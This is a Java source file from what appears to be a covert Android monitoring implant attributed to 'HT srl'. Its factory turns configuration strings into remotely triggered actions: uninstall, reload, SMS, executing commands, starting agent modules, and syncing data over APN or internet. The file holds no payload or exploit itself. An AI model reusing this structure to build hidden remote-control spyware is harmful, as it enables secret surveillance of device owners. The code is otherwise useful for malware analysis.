/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 03-dec-2010
 **********************************************/

package com.android.service.action;

import org.json.JSONException;
import org.json.JSONObject;

import com.android.service.Status;
import com.android.service.Trigger;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAction;
import com.android.service.conf.ConfigurationException;
import com.android.service.event.BaseEvent;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class SubAction.
 */
public abstract class SubAction {

	private static final String TAG = "SubAction"; //$NON-NLS-1$

	/** Parameters. */
	private final ConfAction conf;

	/** The want uninstall. */
	// protected boolean wantUninstall;

	/** The want reload. */
	// protected boolean wantReload;

	/** The status. */
	Status status;

	/**
	 * Instantiates a new sub action.
	 * 
	 * @param type
	 *            the type
	 * @param jsubaction
	 *            the params
	 */
	public SubAction(final ConfAction conf) {
		this.status = Status.self();
		this.conf = conf;

		parse(conf);
	}

	/**
	 * Factory.
	 * 
	 * @param type
	 * 
	 * @param typeId
	 *            the type
	 * @param params
	 *            the conf params
	 * @return the sub action
	 * @throws JSONException
	 * @throws ConfigurationException
	 */
	public static SubAction factory(String type, final ConfAction params) throws ConfigurationException {
		if (Cfg.DEBUG)
			Check.asserts(type != null, "factory: null type");

		if (type.equals("uninstall")) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_UNINSTALL ***");//$NON-NLS-1$
			}
			return new UninstallAction(params);
		} else if (type.equals("reload")) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_RELOAD ***");//$NON-NLS-1$
			}
			return new ReloadAction(params);

		} else if (type.equals("sms")) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_SMS ***");//$NON-NLS-1$
			}
			return new SmsAction(params);

		} else if (type.equals("module")) {
			String status = params.getString("status");
			if (status.equals("start")) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_START_AGENT ***");//$NON-NLS-1$
				}
				return new StartModuleAction(params);
			} else if (status.equals("stop")) {

				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_STOP_AGENT ***");//$NON-NLS-1$
				}
				return new StopModuleAction(params);

			}
		} else if (type.equals("event")) {
			String status = params.getString("status");
			if (status.equals("start")) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_START_EVENT ***");//$NON-NLS-1$
				}
				return new StartEventAction(params);
			} else if (status.equals("stop")) {

				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_STOP_EVENT ***");//$NON-NLS-1$
				}
				return new StopEventAction(params);

			}

		} else if (type.equals("synchronize")) {
			boolean apn = params.has("apn");
			if (apn) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_SYNC_APN ***");//$NON-NLS-1$
				}
				return new SyncActionApn(params);
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_SYNC ***");//$NON-NLS-1$
				}
				return new SyncActionInternet(params);
			}

		} else if (type.equals("execute")) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_EXECUTE ***");//$NON-NLS-1$
			}
			return new ExecuteAction(params);

		} else if (type.equals("log")) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_INFO ***");//$NON-NLS-1$
			}
			return new LogAction(params);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (factory) Error: unknown type: " + type);
			}
		}
		return null;
	}

	public String getType() {
		return conf.getType();
	}

	/** The finished. */
	private boolean finished;

	/**
	 * Parse
	 * 
	 * @param jsubaction
	 *            byte array from configuration
	 */
	protected abstract boolean parse(final ConfAction jsubaction);

	/**
	 * Execute.
	 * 
	 * @param trigger
	 * 
	 * @return true, if successful
	 */
	public abstract boolean execute(Trigger trigger);

	/**
	 * Check. if is finished. //$NON-NLS-1$
	 * 
	 * @return true, if is finished
	 */
	public synchronized boolean isFinished() {
		return finished;
	}

	/**
	 * Prepare execute.
	 */
	public void prepareExecute() {
		synchronized (this) {
			finished = false;
		}
	}

	@Override
	public String toString() {
		if(Cfg.DEBUG){
			return "SubAction (" + conf.actionId + "/" + conf.subActionId + ") <" + conf.getType().toUpperCase() + "> " + conf; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
		}else{
			return conf.actionId + "/" + conf.subActionId;
		}
	}

}